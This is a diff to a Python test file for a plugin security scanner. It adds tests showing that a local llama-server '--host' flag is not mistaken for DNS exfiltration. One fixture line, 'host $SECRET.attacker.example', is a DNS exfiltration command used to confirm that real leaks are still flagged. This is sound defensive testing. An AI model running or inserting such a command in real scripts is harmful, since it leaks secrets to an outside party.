@@ -125,6 +125,26 @@ class TestMaliciousPlugin:
         assert result.verdict == "dangerous"
 
 
+class TestLegitimatePluginPayload:
+    def test_llama_host_flag_is_not_dns_exfil(self, tmp_path):
+        files = dict(BASE_FILES)
+        files["launch.sh"] = (
+            'llama-server -m "$path" --host 127.0.0.1 --port $PORT -ngl 999 -c $CTX\n'
+        )
+        plugin = _mk_plugin(tmp_path, files)
+        result = scan_plugin(plugin)
+        assert not any(f.pattern_id == "dns_exfil" for f in result.findings)
+        assert result.verdict != "dangerous"
+
+    def test_real_dns_exfil_still_flagged(self, tmp_path):
+        files = dict(BASE_FILES)
+        files["launch.sh"] = 'host $SECRET.attacker.example\n'
+        plugin = _mk_plugin(tmp_path, files)
+        result = scan_plugin(plugin)
+        assert any(f.pattern_id == "dns_exfil" for f in result.findings)
+        assert result.verdict == "dangerous"
+
+
 class TestCautionPolicy:
     def test_caution_requires_confirmation(self, tmp_path):
         files = dict(BASE_FILES)
